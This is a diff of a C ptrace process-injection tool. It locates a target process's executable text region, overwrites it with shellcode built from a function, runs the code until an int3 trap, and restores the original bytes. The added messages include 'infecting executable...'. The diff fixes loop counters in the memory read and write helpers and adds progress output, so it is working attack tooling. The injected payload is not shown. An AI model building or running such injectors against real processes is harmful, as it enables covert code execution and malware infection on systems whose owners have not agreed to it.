@@ -124,17 +124,20 @@ int main(int argc, char** argv) {
 	h.base = get_text_base(h.pid);
 	h.shellcode = create_fn_shellcode((void*)&injection_code, shellcode_size);
 
+	printf(".text section for injection found: 0x%lx\n", h.base);
 	/* Read original .text section */
-	origcode = alloca(shellcode_size);
+	origcode = alloca(shellcode_size * sizeof(uint8_t*) + 8);
 	if (pid_read(h.pid, (void*)origcode, (void*)h.base, shellcode_size) < 0) {
 		exit(EXIT_FAILURE);
 	}
+	printf("Read original .text section\n");
 	
 	/* Write shellcode */
 	if (pid_write(h.pid, (void*)h.base, (void*)h.shellcode, shellcode_size) < 0) {
 		exit(EXIT_FAILURE);
 	}
-	
+	printf("Write shellcode to process\n");
+
 	/* Get current registers */
 	if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
 		perror("PTRACE_GETREGS");
@@ -150,17 +153,22 @@ int main(int argc, char** argv) {
 		perror("PTRACE_SETREGS");
 		exit(EXIT_FAILURE);
 	}
+	printf("Update registers\n");
+
 	/* Continue execution while int3 interuption in shellcode encounted */
 	if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0) {
 		perror("PTRACE_CONT");
 		exit(EXIT_FAILURE);
 	}
+	printf("Continue execution while int3 register occured\n");
+
 	/* Wait for interuption signal */
 	wait(&status);
 	if (WSTOPSIG(status) != SIGTRAP) {
-		printf("Something went wrong/n");
+		printf("Something went wrong, signal diffenciate from SIGTRAP was received\n");
 		exit(EXIT_FAILURE);
 	}
+	printf("INT3 register successfully encounted, infecting executable...\n");
 
 	/* Restore original section */
 	if (pid_write(h.pid, (void*)h.base, (void*)origcode, shellcode_size) < 0) {
@@ -217,6 +225,7 @@ int pid_write(int pid, void* dst, const void* src, size_t len) {
 		}
 		s += sizeof(void*);
 		d += sizeof(void*);
+		quot--;
 	}
 	return 0;
 fail:
@@ -236,8 +245,9 @@ int pid_read(int pid, void* dst, const void* src, size_t len) {
 			goto fail;
 		}
 		*(long *)d = word;
-		s += sizeof(long);
-		d += sizeof(long);
+		s += sizeof(void *);
+		d += sizeof(void *);
+		sz--;
 	}
 	return 0;
 fail:
@@ -263,7 +273,6 @@ uint64_t get_text_base(pid_t pid) {
 		if ((ent->properties & PROC_MAPS_READ) && 
 			(ent->properties & PROC_MAPS_EXECUTE) &&
 			(ent->properties & PROC_MAPS_PRIVATE)) {
-			/* Found text section */
 			res = (uint64_t)ent->addr_start;
 			delete_proc_maps_file_interator(iter);
 			return res;
@@ -272,6 +281,37 @@ uint64_t get_text_base(pid_t pid) {
 	delete_proc_maps_file_interator(iter);
 	return 1;
 }
+
+/*
+#define MAX_PATH 512
+
+uint64_t get_text_base(pid_t pid) {
+	char maps[MAX_PATH], line[256];
+	char *start, *p;
+	FILE *fd;
+	int i;
+	Elf64_Addr base;
+	snprintf(maps, MAX_PATH, "/proc/%d/maps", pid);
+	if ((fd = fopen(maps, "r")) == NULL) {
+		fprintf(stderr, "Cannot open %s for reading: %s", maps, strerror(errno));
+		return 1;
+	}
+	while (fgets(line, sizeof(line), fd)) {
+		if (!strstr(line, "rxp")) {
+			continue;
+		}
+		for (i = 0, start = alloca(32), p = line; *p != ' '; i++, p++) {
+			start[i] = *p;
+		}
+
+		start[i] = '\0';
+		base = strtoul(start, NULL, 16);
+		break;
+	}
+	fclose(fd);
+	return base;
+}
+*/
 
 /* Transform function to memory shellcode */
 uint8_t* create_fn_shellcode(void (*fn)(), size_t len) {
